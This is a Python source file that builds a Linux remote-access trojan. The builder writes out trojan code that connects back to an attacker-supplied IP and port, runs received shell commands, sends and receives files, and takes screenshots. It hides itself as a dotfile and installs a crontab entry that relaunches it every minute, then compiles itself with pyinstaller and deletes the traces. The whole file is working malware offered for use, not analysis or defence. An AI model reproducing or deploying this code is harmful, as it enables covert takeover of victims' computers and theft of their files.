import os
import sys


def create_trojan_linux(ip, port):

    trojan = r"""import sys
import getpass
import os
import fcntl
import socket
import pwd
import subprocess
import pyautogui


class Trojan():

    __direcgo = 0
    __start = 0
    __ip = '"""+ip+"""'
    __port = """+port+r"""

    BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

    
    def __init__(self):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.port = self.__port
            self.s.connect((self.__ip, self.port))

            self.while_run()

        except:
            pass
        
    #-----------------------------------------
    def while_run(self):
        while True:
            self.directorystart()
            self.datas = self.s.recv(1024).decode('utf-8')

            if self.datas == 'exit':
                self.exit()

            elif self.datas == '[pictur]':
                self.pictursave()

            elif self.datas[:2] == 'cd':
                self.directorygo(self.datas[3:])        

            elif self.datas[:2] == 'd$':
                self.file_download(self.datas[2:])

            elif self.datas[0] == '$':
                self.file_send(self.datas[1:])

            else:
                self.command_send(self.datas)


    #-----------------------------------------
    def pictursave(self):
        pictur = pyautogui.screenshot("pictur.png")

    #-----------------------------------------
    def file_download(self, command):
        self.f = open(command, 'wb')
        self.data = self.s.recv(1024)

        while self.data:
            if self.data[-4:] == b'None':
                self.f.write(self.data[:-4])
                self.f.close()
                break

            self.f.write(self.data)
            self.data = self.s.recv(1024)


    #-----------------------------------------
    def file_send(self, command):
        try:
            self.f = open(command, 'rb')
            self.data = self.f.read()

            while self.data != bytes("".encode()):
                self.s.send(self.data)
                self.data = self.f.read()

            self.f.close()
            self.data = 'None'
            self.s.send(self.data.encode('utf-8'))

        except:
            self.s.send(bytes('None'.encode("utf-8")))

    #-----------------------------------------

    def directorystart(self):
        if self.__start == 0:
            self.nodename = os.uname().nodename
            self.directory = os.getcwd()
            self.whoami = pwd.getpwuid( os.getuid() ).pw_name

            self.all_about = '({}tr{}) {}[ {}@{}:~ ]{}{}{}$'.format(self.RED, self.END, self.GREEN, self.whoami, self.nodename, self.BLUE, self.directory, self.END)
            self.s.send(bytes(self.all_about.encode("utf-8")))
            self.__start = 1

        else:
            pass


    #-----------------------------------------
    def directorygo(self, command):
        try:
            command = command.strip()

            if command == '-' and self.__direcgo != 0:
                self.present1 = self.present
                self.present = os.getcwd()
                os.chdir(self.present1)
                self.__start = 0

            elif command == '-' and self.__direcgo == 0:
                self.__start = 0

            elif os.path.isdir(command) == True: # dizinin var olup olmadigini yoxlayiram
                self.present = os.getcwd()
                os.chdir(command)
                self.__start = 0
                self.__direcgo = 1

            else:
                self.__start = 0

        except:
            self.__start = 0

    #-----------------------------------------
    def command_send(self, data):
        try:
            data = data.strip()
            data = data.split(' ')
            self.command = subprocess.check_output(data, universal_newlines = True).strip().encode('utf-8')


            self.s.send(self.command)
            self.s.send(bytes("None".encode("utf-8")))

        except:
            self.s.send(bytes("NoneC".encode("utf-8")))


    #---------------------------------------
    def exit(self):
        sys.exit(1)


#---------------------------------------
def start_trojan():
    trojan = Trojan()

#----------------------------------------
def main():
    pid_file = '.program.pid'
    fp = open(pid_file, 'w')

    fcntl.lockf(fp, fcntl.LOCK_EX | fcntl.LOCK_NB)
    start_trojan()

#----------------------------------------

def start_program():
    directory = os.getcwd()
    file_name = sys.argv[0].split('/')[-1]

    if file_name[0] == '.': # eger dosya gizlidirse trojan basladilsin
        main()

    else: # eger dosya gizli deylse yeni isledilmeyibse
        crontab ="crontab -l | { cat; echo '"+"*/1 * * * * export DISPLAY=:0 && "+directory+"/./."+file_name+"'; } | crontab -"
        
        file_change = 'mv {} .{}'.format(file_name, file_name)
        os.system(crontab)
        os.system(file_change)

start_program()"""
    

    dosya = open("tromux.py", 'w')
    dosya.write(trojan)
    dosya.close()
    os.system("pyinstaller --onefile tromux.py")
    os.system("rm -r build __pycache__ tromux.spec")
    dizin = os.getcwd()
    islem = 'mv dist/tromux {}'.format(dizin)
    os.system(islem)
    os.system("rm tromux.py")
    os.system('rm -r dist')

